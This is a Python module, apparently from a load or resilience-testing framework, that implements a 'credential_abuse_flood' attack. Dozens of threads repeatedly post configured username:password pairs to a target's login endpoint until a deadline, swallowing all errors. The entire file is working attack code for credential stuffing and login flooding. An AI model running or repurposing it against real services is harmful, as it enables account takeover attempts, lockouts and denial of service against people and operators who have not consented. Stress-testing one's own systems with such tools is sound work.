#!/usr/bin/env python3
import threading
import time
import logging
import requests


class Attack:
    def __init__(self, configuration, design_path, output_path, test_identifier):
        self.configuration = configuration
        self.output_path = output_path
        self.test_identifier = test_identifier
        self.base_url = (configuration.get("locust_host_url") or "").rstrip("/")
        self.login_path = configuration.get("attack_login_path") or "/login"
        # Space-separated list of user:pass entries
        raw_creds = configuration.get("attack_credentials") or "user@example.com:password"
        self.credentials = []
        for entry in raw_creds.split():
            if ":" in entry:
                self.credentials.append(tuple(entry.split(":", 1)))
        self.concurrency = int(float(configuration.get("attack_concurrency", 50)))
        self.timeout = float(configuration.get("attack_request_timeout_seconds", 5))

    def worker(self, end_ts, stop_event):
        session = requests.Session()
        url = f"{self.base_url}{self.login_path}"
        while (time.time() < end_ts) and (not stop_event.is_set()):
            for username, password in self.credentials:
                if (time.time() >= end_ts) or stop_event.is_set():
                    break
                try:
                    session.post(url, json={"username": username, "password": password}, timeout=self.timeout)
                except Exception:
                    # best-effort flood; ignore
                    pass

    def run(self, duration_seconds, stop_event):
        logging.info("credential_abuse_flood: starting")
        end_ts = time.time() + duration_seconds
        threads = [threading.Thread(target=self.worker, args=(end_ts, stop_event), daemon=True) for _ in range(self.concurrency)]
        for t in threads:
            t.start()
        for t in threads:
            remaining = max(0.0, end_ts - time.time())
            t.join(timeout=remaining)
        logging.info("credential_abuse_flood: finished")

